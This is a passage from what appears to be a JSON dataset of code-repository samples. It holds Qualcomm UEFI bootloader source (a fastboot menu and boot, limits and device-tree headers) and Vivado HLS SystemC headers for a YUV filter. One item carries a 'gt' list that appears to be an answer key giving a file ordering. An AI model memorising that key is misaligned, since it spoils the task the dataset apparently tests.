NULL;\n\n  if (pLocation != NULL)\n    *pLocation = Location;\n\n  return Status;\n}\n\n\nSTATIC EFI_STATUS\nFastbootMenuShowScreen (OPTION_MENU_INFO *OptionMenuInfo)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  UINT32 Location = 0;\n  UINT32 OptionItem = 0;\n  UINT32 Height = 0;\n  UINT32 i = 0;\n  CHAR8 StrTemp[MAX_RSP_SIZE] = \"\";\n  CHAR8 StrTemp1[MAX_RSP_SIZE] = \"\";\n  CHAR8 VersionTemp[MAX_VERSION_LEN] = \"\";\n\n  ZeroMem (&OptionMenuInfo->Info, sizeof (MENU_OPTION_ITEM_INFO));\n\n\n  OptionMenuInfo->Info.MsgInfo = mFastbootOptionTitle;\n  for (i = 0; i < ARRAY_SIZE (mFastbootOptionTitle); i++) {\n    OptionMenuInfo->Info.OptionItems[i] = i;\n  }\n  OptionItem =\n      OptionMenuInfo->Info.OptionItems[OptionMenuInfo->Info.OptionIndex];\n  Status = UpdateFastbootOptionItem (OptionItem, &Location);\n  if (Status != EFI_SUCCESS)\n    return Status;\n\n\n  for (i = 0; i < ARRAY_SIZE (mFastbootCommonMsgInfo); i++) {\n    switch (i) {\n    case 0:\n    case 1:\n      break;\n    case 2:\n\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n        sizeof (mFastbootCommonMsgInfo[i].Msg), FixedPcdGetPtr(PcdABLProduct),\n        AsciiStrLen (FixedPcdGetPtr(PcdABLProduct)));\n      break;\n    case 3:\n\n      BoardHwPlatformName (StrTemp, sizeof (StrTemp));\n      GetRootDeviceType (StrTemp1, sizeof (StrTemp1));\n\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), StrTemp,\n                     sizeof (StrTemp));\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), \" \",\n                     AsciiStrLen (\" \"));\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), StrTemp1,\n                     sizeof (StrTemp1));\n      break;\n    case 4:\n\n      GetBootloaderVersion (VersionTemp, sizeof (VersionTemp));\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), VersionTemp,\n                     sizeof (VersionTemp));\n      break;\n    case 5:\n\n      ZeroMem (VersionTemp, sizeof (VersionTemp));\n      GetRadioVersion (VersionTemp, sizeof (VersionTemp));\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), VersionTemp,\n                     sizeof (VersionTemp));\n      break;\n    case 6:\n\n      ZeroMem (StrTemp, sizeof (StrTemp));\n      BoardSerialNum (StrTemp, MAX_RSP_SIZE);\n      AsciiStrnCatS (mFastbootCommonMsgInfo[i].Msg,\n                     sizeof (mFastbootCommonMsgInfo[i].Msg), StrTemp,\n                     sizeof (StrTemp));\n      break;\n    case 7:\n\n      AsciiStrnCatS (\n          mFastbootCommonMsgInfo[i].Msg, sizeof (mFastbootCommonMsgInfo[i].Msg),\n          IsSecureBootEnabled () ? \"yes\" : \"no\",\n          IsSecureBootEnabled () ? AsciiStrLen (\"yes\") : AsciiStrLen (\"no\"));\n      break;\n    case 8:\n\n      AsciiStrnCatS (\n          mFastbootCommonMsgInfo[i].Msg, sizeof (mFastbootCommonMsgInfo[i].Msg),\n          IsUnlocked () ? \"unlocked\" : \"locked\",\n          IsUnlocked () ? AsciiStrLen (\"unlocked\") : AsciiStrLen (\"locked\"));\n      break;\n    }\n\n    mFastbootCommonMsgInfo[i].Location = Location;\n    Status = DrawMenu (&mFastbootCommonMsgInfo[i], &Height);\n    if (Status != EFI_SUCCESS)\n      return Status;\n    Location += Height;\n  }\n\n  OptionMenuInfo->Info.MenuType = DISPLAY_MENU_FASTBOOT;\n  OptionMenuInfo->Info.OptionNum = ARRAY_SIZE (mFastbootOptionTitle);\n\n  return Status;\n}\n\n\nVOID DisplayFastbootMenu (VOID)\n{\n  EFI_STATUS Status;\n  OPTION_MENU_INFO *OptionMenuInfo;\n\n  if (IsEnableDisplayMenuFlagSupported ()) {\n    OptionMenuInfo = &gMenuInfo;\n    DrawMenuInit ();\n    OptionMenuInfo->LastMenuType = OptionMenuInfo->Info.MenuType;\n\n    Status = FastbootMenuShowScreen (OptionMenuInfo);\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"Unable to show fastboot menu on screen: %r\\n\",\n              Status));\n      return;\n    }\n\n    MenuKeysDetectionInit (OptionMenuInfo);\n    DEBUG ((EFI_D_VERBOSE, \"Creating fastboot menu keys detect event\\n\"));\n  } else {\n    DEBUG ((EFI_D_INFO, \"Display menu is not enabled!\\n\"));\n  }\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'\n:\n\n#ifndef __BOOTLINUXLIB_H__\n#define __BOOTLINUXLIB_H__\n\n#include <Uefi.h>\n\n#include <Guid/FileInfo.h>\n#include <Guid/FileSystemInfo.h>\n#include <Guid/Gpt.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/DrawUI.h>\n#include <Library/IoLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PrintLib.h>\n#include <Library/TimerLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <PiDxe.h>\n#include <Protocol/BlockIo.h>\n#include <Protocol/DevicePath.h>\n#include <Protocol/EFIVerifiedBoot.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/SerialIo.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Protocol/EFISecRSA.h>\n#include <Protocol/Hash.h>\n#include <Protocol/Hash2.h>\n#include <Protocol/EFIASN1X509.h>\n\n#include \"Board.h\"\n#include \"BootImage.h\"\n#include \"Decompress.h\"\n#include \"DeviceInfo.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"LocateDeviceTree.h\"\n#include \"PartitionTableUpdate.h\"\n#include \"Recovery.h\"\n#include \"ShutdownServices.h\"\n#include \"UpdateCmdLine.h\"\n#include \"UpdateDeviceTree.h\"\n#include \"VerifiedBoot.h\"\n\n#define ALIGN32_BELOW(addr) ALIGN_POINTER (addr - 32, 32)\n#define LOCAL_ROUND_TO_PAGE(x, y) (((x) + (y - 1)) & (~(y - 1)))\n#define ROUND_TO_PAGE(x, y) ((ADD_OF ((x), (y))) & (~(y)))\n#define ALIGN_PAGES(x, y) (((x) + (y - 1)) / (y))\n#define DECOMPRESS_SIZE_FACTOR 8\n#define ALIGNMENT_MASK_4KB 4096\n#define MAX_NUMBER_OF_LOADED_IMAGES 32\n\n#define PATCHED_KERNEL_HEADER_SIZE 20\n\n#define PATCHED_KERNEL_MAGIC \"UNCOMPRESSED_IMG\"\n\n\n#define DT_SIZE_2MB      (2 * 1024 * 1024)\n\n#define KERNEL_32BIT_LOAD_OFFSET 0x8000\n#define KERNEL_64BIT_LOAD_OFFSET 0x80000\n\ntypedef enum {\n  KERNEL_32BIT = 0,\n  KERNEL_64BIT\n} KernelMode;\n\ntypedef enum {\n LOAD_ADDR_NONE = 0,\n LOAD_ADDR_KERNEL,\n LOAD_ADDR_RAMDISK\n} AddrType;\n\ntypedef VOID (*LINUX_KERNEL) (UINT64 ParametersBase,\n                              UINT64 Reserved0,\n                              UINT64 Reserved1,\n                              UINT64 Reserved2);\ntypedef VOID (*LINUX_KERNEL32) (UINT32 Zero, UINT32 Arch, UINTN ParametersBase);\n\ntypedef enum {\n        IMG_BOOT = 0,\n        IMG_DTBO,\n        IMG_VBMETA,\n        IMG_RECOVERY,\n        IMG_VENDOR_BOOT,\n        IMG_MAX\n} img_type;\n\ntypedef struct {\n  CHAR8 *Name;\n  VOID *ImageBuffer;\n  UINTN ImageSize;\n} ImageData;\n\ntypedef struct BootInfo {\n  BOOLEAN MultiSlotBoot;\n  BOOLEAN BootIntoRecovery;\n  BOOLEAN BootReasonAlarm;\n  CHAR16 Pname[MAX_GPT_NAME_SIZE];\n  CHAR16 BootableSlot[MAX_GPT_NAME_SIZE];\n  ImageData Images[MAX_NUMBER_OF_LOADED_IMAGES];\n  UINTN NumLoadedImages;\n  QCOM_VERIFIEDBOOT_PROTOCOL *VbIntf;\n  boot_state_t BootState;\n  CHAR8 *VBCmdLine;\n  UINT32 VBCmdLineLen;\n  UINT32 VBCmdLineFilledLen;\n  VOID *VBData;\n  UINT32 HeaderVersion;\n} BootInfo;\n\ntypedef struct BootLinuxParamlist {\n\n  UINT64 BaseMemory;\n\n  VOID *ImageBuffer;\n  UINT64 ImageSize;\n  VOID *DtboImgBuffer;\n\n\n  VOID *VendorImageBuffer;\n  UINT64 VendorImageSize;\n\n\n  UINT64 KernelLoadAddr;\n  UINT64 KernelEndAddr;\n  UINT64 RamdiskLoadAddr;\n  UINT64 DeviceTreeLoadAddr;\n  UINT64 *HypDtboBaseAddr;\n  UINT32 NumHypDtbos;\n\n\n  UINT32 PageSize;\n  UINT32 KernelSize;\n  UINT32 SecondSize;\n  UINT32 RamdiskSize;\n  UINT32 RamdiskOffset;\n  UINT32 PatchedKernelHdrSize;\n  UINT32 DtbOffset;\n\n\n\n  UINT32 VendorRamdiskSize;\n\n\n  UINT32 KernelSizeActual;\n\n  CHAR8 *FinalCmdLine;\n  CHAR8 *CmdLine;\n  BOOLEAN BootingWith32BitKernel;\n  BOOLEAN BootingWithPatchedKernel;\n  BOOLEAN BootingWithGzipPkgKernel;\n} BootParamlist;\n\nEFI_STATUS\nBootLinux (BootInfo *Info);\nEFI_STATUS\nCheckImageHeader (VOID *ImageHdrBuffer,\n                  UINT32 ImageHdrSize,\n                  VOID *VendorImageHdrBuffer,\n                  UINT32 VendorImageHdrSize,\n                  UINT32 *ImageSizeActual,\n                  UINT32 *PageSize,\n                  BOOLEAN BootIntoRecovery);\nEFI_STATUS\nLoadImageHeader (CHAR16 *Pname, VOID **ImageHdrBuffer, UINT32 *ImageHdrSize);\nEFI_STATUS\nLoadImage (CHAR16 *Pname, VOID **ImageBuffer,\n           UINT32 ImageSizeActual, UINT32 PageSize);\n\n\nBOOLEAN TargetBuildVariantUser (VOID);\nBOOLEAN IsLEVariant (VOID);\nBOOLEAN IsBuildAsSystemRootImage (VOID);\nBOOLEAN IsBuildUseRecoveryAsBoot (VOID);\nEFI_STATUS\nGetImage (CONST BootInfo *Info,\n          VOID **ImageBuffer,\n          UINTN *ImageSize,\n          CHAR8 *ImageName);\nBOOLEAN\nLoadAndValidateDtboImg (BootInfo *Info,\n                        BootParamlist *BootParamlistPtr);\nVOID SetBootDevImage (VOID);\nVOID ResetBootDevImage (VOID);\nBOOLEAN IsBootDevImage (VOID);\nBOOLEAN IsABRetryCountDisabled (VOID);\nBOOLEAN IsDynamicPartitionSupport (VOID);\nBOOLEAN IsVirtualAbOtaSupported (VOID);\nUINT64 SetandGetLoadAddr (BootParamlist *BootParamlistPtr, AddrType Type);\nBOOLEAN IsNANDSquashFsSupport (VOID);\nBOOLEAN IsEnableDisplayMenuFlagSupported (VOID);\nBOOLEAN IsSystemdBootslotEnabled (VOID);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFILimits.h'\n:\n#ifndef __EFILIMITS_H__\n#define __EFILIMITS_H__\n\n\n\n\n\n\n#define EFI_LIMITS_PROTOCOL_REVISION 0x0000000000010000\n\n\n\n\n#define EFI_LIMITS_PROTOCOL_GUID                                               \\\n  {                                                                            \\\n    0x79d6c879, 0x725e, 0x489e,                                                \\\n    {                                                                          \\\n      0xa0, 0xa9, 0x27, 0xef, 0xa5, 0xdf, 0xcb, 0x35                           \\\n    }                                                                          \\\n  }\n\n\n\n\nextern EFI_GUID gEfiLimitsProtocolGuid;\n\n\n\n\ntypedef struct _EFI_LIMITS_PROTOCOL EFI_LIMITS_PROTOCOL;\n\n\n\ntypedef enum {\n  EFI_LIMITS_THROTTLE_NONE = 0,\n  EFI_LIMITS_THROTTLE_MIN,\n  EFI_LIMITS_THROTTLE_QUARTER,\n  EFI_LIMITS_THROTTLE_HALF,\n  EFI_LIMITS_THROTTLE_THREE_QUARTER,\n  EFI_LIMITS_THROTTLE_MAX,\n  EFI_LIMITS_THROTTLE_MAX_DISABLE,\n  EFI_LIMITS_THROTTLE_VALUE,\n  EFI_LIMITS_THROTTLE_INVALID,\n  EFI_LIMITS_THROTTLE_32BITS = 0x7FFFFFFF,\n} EFI_LIMITS_THROTTLE_TYPE;\n\n\ntypedef enum {\n  EFI_LIMITS_SUBSYS_APC0 = 0,\n  EFI_LIMITS_SUBSYS_APC1,\n  EFI_LIMITS_SUBSYS_GPU,\n  EFI_LIMITS_SUBSYS_INVALID,\n  EFI_LIMITS_SUBSYS_32BITS = 0x7FFFFFFF,\n} EFI_LIMITS_SUBSYS_ID;\n\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_LIMITS_SUBSYS_THROTTLE) (\n    IN EFI_LIMITS_PROTOCOL *This,\n    IN EFI_LIMITS_SUBSYS_ID SubsysId,\n    OUT EFI_LIMITS_THROTTLE_TYPE *Throttle,\n    OUT UINT32 *Value);\n\n\n\nstruct _EFI_LIMITS_PROTOCOL {\n  UINT64 Revision;\n  EFI_LIMITS_SUBSYS_THROTTLE SubSysThrottle;\n};\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateDeviceTree.h'\n:\n\n#ifndef __UPDATEDEVICETREE_H__\n#define __UPDATEDEVICETREE_H__\n\n#include \"libfdt.h\"\n#include <Library/Board.h>\n#include <Library/DebugLib.h>\n#include <Library/LinuxLoaderLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <Protocol/EFILimits.h>\n#include <Protocol/EFIRamPartition.h>\n#include <Uefi.h>\n\n#define DTB_MAX_SUBNODE 128\n\n#define MSMCOBALT_PGOOD_FUSE 0x78013C\n#define MSMCOBALT_PGOOD_SUBBIN_FUSE 0x780324\n#define DTB_OFFSET_LOCATION_IN_ARCH32_KERNEL_HDR 0x2C\n\n#define PARTIAL_GOOD_GOLD_DISABLE 0x1\n\n\n#define CHECK_ADD64(a, b) ((MAX_UINT64 - b < a) ? TRUE : FALSE)\n\n\nstruct FstabNode {\n  CONST CHAR8 *ParentNode;\n  CONST CHAR8 *Property;\n  CONST CHAR8 *DevicePathId;\n};\n\nstruct DisplaySplashBufferInfo {\n\n  UINT32 uVersion;\n\n  UINT32 uFrameAddr;\n\n  UINT32 uFrameSize;\n};\n\n#pragma pack(push)\n#pragma pack(1)\n\nstruct DisplayDemuraInfoType {\n  UINT32 Version;\n  UINT64 Demura0PanelID;\n  UINT32 Demura0HFCAddr;\n  UINT32 Demura0HFCSize;\n  UINT64 Demura1PanelID;\n  UINT32 Demura1HFCAddr;\n  UINT32 Demura1HFCSize;\n};\n#pragma pack(pop)\n\nINT32\ndev_tree_add_mem_info (VOID *fdt, UINT32 offset, UINT32 addr, UINT32 size);\n\nINT32\ndev_tree_add_mem_infoV64 (VOID *fdt, UINT32 offset, UINT64 addr, UINT64 size);\n\nEFI_STATUS\nUpdateDeviceTree (VOID *DeviceTreeLoadAddr,\n                  CONST CHAR8 *CmdLine,\n                  VOID *RamDiskLoadAddr,\n                  UINT32 RamDiskSize,\n                  BOOLEAN BootingWith32BitKernel);\n\nEFI_STATUS\nUpdateFstabNode (VOID *fdt);\n\nUINT32\nfdt_check_header_ext (VOID *fdt);\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFILimits.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateDeviceTree.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/FastbootMenu.c'"
        ]
    },
    {
        "files": [
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter_mac_mubkb.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter_test.c'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/rgb2yuv.h'"
        ],
        "content": "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter_mac_mubkb.h'\n:\n\n\n\n\n\n\n#ifndef __yuv_filter_mac_mubkb__HH__\n#define __yuv_filter_mac_mubkb__HH__\n#include \"simcore_mac_0.h\"\n#include <systemc>\n\ntemplate<\n    int ID,\n    int NUM_STAGE,\n    int din0_WIDTH,\n    int din1_WIDTH,\n    int din2_WIDTH,\n    int dout_WIDTH>\nSC_MODULE(yuv_filter_mac_mubkb) {\n    sc_core::sc_in< sc_dt::sc_lv<din0_WIDTH> >   din0;\n    sc_core::sc_in< sc_dt::sc_lv<din1_WIDTH> >   din1;\n    sc_core::sc_in< sc_dt::sc_lv<din2_WIDTH> >   din2;\n    sc_core::sc_out< sc_dt::sc_lv<dout_WIDTH> >   dout;\n\n\n\n    simcore_mac_0<ID, 1, din0_WIDTH, din1_WIDTH, din2_WIDTH, dout_WIDTH> simcore_mac_0_U;\n\n    SC_CTOR(yuv_filter_mac_mubkb):  simcore_mac_0_U (\"simcore_mac_0_U\") {\n        simcore_mac_0_U.din0(din0);\n        simcore_mac_0_U.din1(din1);\n        simcore_mac_0_U.din2(din2);\n        simcore_mac_0_U.dout(dout);\n\n    }\n\n};\n\n#endif\n\n'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter.h'\n:\n\n\n\n\n\n\n#ifndef _yuv_filter_HH_\n#define _yuv_filter_HH_\n\n#include \"systemc.h\"\n#include \"AESL_pkg.h\"\n\n#include \"rgb2yuv.h\"\n#include \"yuv2rgb.h\"\n#include \"yuv_filter_p_yuv_hbi.h\"\n\nnamespace ap_rtl {\n\nstruct yuv_filter : public sc_module {\n\n    sc_in_clk ap_clk;\n    sc_in< sc_logic > ap_rst;\n    sc_in< sc_logic > ap_start;\n    sc_out< sc_logic > ap_done;\n    sc_out< sc_logic > ap_idle;\n    sc_out< sc_logic > ap_ready;\n    sc_out< sc_lv<22> > in_channels_ch1_address0;\n    sc_out< sc_logic > in_channels_ch1_ce0;\n    sc_in< sc_lv<8> > in_channels_ch1_q0;\n    sc_out< sc_lv<22> > in_channels_ch2_address0;\n    sc_out< sc_logic > in_channels_ch2_ce0;\n    sc_in< sc_lv<8> > in_channels_ch2_q0;\n    sc_out< sc_lv<22> > in_channels_ch3_address0;\n    sc_out< sc_logic > in_channels_ch3_ce0;\n    sc_in< sc_lv<8> > in_channels_ch3_q0;\n    sc_in< sc_lv<16> > in_width;\n    sc_in< sc_lv<16> > in_height;\n    sc_out< sc_lv<22> > out_channels_ch1_address0;\n    sc_out< sc_logic > out_channels_ch1_ce0;\n    sc_out< sc_logic > out_channels_ch1_we0;\n    sc_out< sc_lv<8> > out_channels_ch1_d0;\n    sc_out< sc_lv<22> > out_channels_ch2_address0;\n    sc_out< sc_logic > out_channels_ch2_ce0;\n    sc_out< sc_logic > out_channels_ch2_we0;\n    sc_out< sc_lv<8> > out_channels_ch2_d0;\n    sc_out< sc_lv<22> > out_channels_ch3_address0;\n    sc_out< sc_logic > out_channels_ch3_ce0;\n    sc_out< sc_logic > out_channels_ch3_we0;\n    sc_out< sc_lv<8> > out_channels_ch3_d0;\n    sc_out< sc_lv<16> > out_width;\n    sc_out< sc_logic > out_width_ap_vld;\n    sc_out< sc_lv<16> > out_height;\n    sc_out< sc_logic > out_height_ap_vld;\n    sc_in< sc_lv<8> > Y_scale;\n    sc_in< sc_lv<8> > U_scale;\n    sc_in< sc_lv<8> > V_scale;\n\n\n\n    yuv_filter(sc_module_name name);\n    SC_HAS_PROCESS(yuv_filter);\n\n    ~yuv_filter();\n\n    sc_trace_file* mVcdFile;\n\n    ofstream mHdltvinHandle;\n    ofstream mHdltvoutHandle;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch1_U;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch2_U;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch3_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch1_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch2_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch3_U;\n    rgb2yuv* grp_rgb2yuv_fu_250;\n    yuv2rgb* grp_yuv2rgb_fu_270;\n    sc_signal< sc_lv<10> > ap_CS_fsm;\n    sc_signal< sc_logic > ap_CS_fsm_state1;\n    sc_signal< sc_lv<16> > p_yuv_width_reg_450;\n    sc_signal< sc_logic > ap_CS_fsm_state2;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_idle;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_ready;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_done;\n    sc_signal< sc_lv<16> > p_yuv_height_reg_456;\n    sc_signal< sc_lv<15> > tmp_i_cast_fu_293_p1;\n    sc_signal< sc_lv<15> > tmp_i_cast_reg_462;\n    sc_signal< sc_lv<15> > tmp_1_i_cast_fu_297_p1;\n    sc_signal< sc_lv<15> > tmp_1_i_cast_reg_467;\n    sc_signal< sc_lv<15> > tmp_2_i_cast_fu_301_p1;\n    sc_signal< sc_lv<15> > tmp_2_i_cast_reg_472;\n    sc_signal< sc_lv<16> > x_fu_310_p2;\n    sc_signal< sc_lv<16> > x_reg_480;\n    sc_signal< sc_logic > ap_CS_fsm_state3;\n    sc_signal< sc_lv<23> > tmp_2_fu_340_p2;\n    sc_signal< sc_lv<23> > tmp_2_reg_485;\n    sc_signal< sc_lv<1> > exitcond1_i_fu_305_p2;\n    sc_signal< sc_lv<16> > y_fu_351_p2;\n    sc_signal< sc_lv<16> > y_reg_493;\n    sc_signal< sc_logic > ap_CS_fsm_state4;\n    sc_signal< sc_lv<64> > tmp_3_cast_fu_366_p1;\n    sc_signal< sc_lv<64> > tmp_3_cast_reg_498;\n    sc_signal< sc_lv<1> > exitcond_i_fu_346_p2;\n    sc_signal< sc_lv<8> > tmp_10_i_reg_520;\n    sc_signal< sc_logic > ap_CS_fsm_state7;\n    sc_signal< sc_lv<8> > tmp_11_i_reg_525;\n    sc_signal< sc_lv<8> > tmp_12_i_reg_530;\n    sc_signal< sc_logic > ap_CS_fsm_state8;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch1_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch1_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch1_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch1_q0;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch2_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch2_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch2_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch2_q0;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch3_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch3_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch3_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch3_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch1_address0;\n    sc_signal< sc_logic > p_scale_channels_ch1_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch1_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch1_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch2_address0;\n    sc_signal< sc_logic > p_scale_channels_ch2_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch2_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch2_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch3_address0;\n    sc_signal< sc_logic > p_scale_channels_ch3_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch3_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch3_q0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_start;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch1_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch1_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch2_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch2_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch3_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch3_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch1_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch1_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch1_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch1_d0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch2_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch2_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch2_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch2_d0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch3_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch3_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch3_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch3_d0;\n    sc_signal< sc_lv<16> > grp_rgb2yuv_fu_250_ap_return_0;\n    sc_signal< sc_lv<16> > grp_rgb2yuv_fu_250_ap_return_1;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_start;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_done;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_idle;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_ready;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch1_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch1_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch2_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch2_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch3_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch3_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch1_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch1_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch1_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch1_d0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch2_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch2_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch2_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch2_d0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch3_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch3_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch3_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch3_d0;\n    sc_signal< sc_lv<16> > grp_yuv2rgb_fu_270_ap_return_0;\n    sc_signal< sc_lv<16> > grp_yuv2rgb_fu_270_ap_return_1;\n    sc_signal< sc_lv<16> > x_i_reg_228;\n    sc_signal< sc_lv<16> > y_i_reg_239;\n    sc_signal< sc_logic > ap_CS_fsm_state9;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_start_reg;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_start_reg;\n    sc_signal< sc_logic > ap_CS_fsm_state10;\n    sc_signal< sc_logic > ap_CS_fsm_state5;\n    sc_signal< sc_logic > ap_CS_fsm_state6;\n    sc_signal< sc_lv<13> > tmp_fu_316_p1;\n    sc_signal< sc_lv<15> > tmp_1_fu_328_p1;\n    sc_signal< sc_lv<23> > p_shl_cast_fu_320_p3;\n    sc_signal< sc_lv<23> > p_shl3_cast_fu_332_p3;\n    sc_signal< sc_lv<23> > tmp_5_i_cast_fu_357_p1;\n    sc_signal< sc_lv<23> > tmp_3_fu_361_p2;\n    sc_signal< sc_lv<8> > tmp_7_i_fu_377_p0;\n    sc_signal< sc_lv<8> > tmp_7_i_fu_377_p1;\n    sc_signal< sc_lv<8> > 